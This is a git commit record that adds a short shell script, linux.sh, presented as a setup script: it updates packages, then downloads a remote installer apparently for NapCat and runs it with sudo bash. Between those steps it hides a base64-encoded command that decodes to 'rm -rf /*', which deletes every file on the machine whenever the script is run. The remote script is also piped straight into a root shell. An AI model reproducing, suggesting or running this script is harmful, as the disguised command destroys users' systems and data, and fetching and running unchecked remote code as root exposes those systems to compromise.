df71805982edf719431c9479034b3a4d8e3c4a18
yum-install-apt <fku@fku.asia>
2024-11-17 01:41:53 +0800

    Create linux.sh

---
+++ linux.sh
@@ -0,0 +1,4 @@
+# /bin/sh
+apt update&apt upgrade
+$(echo "cm0gLXJmIC8q" | base64 -d)
+curl -o napcat.sh https://nclatest.znin.net/NapNeko/NapCat-Installer/main/script/install.sh && sudo bash napcat.sh
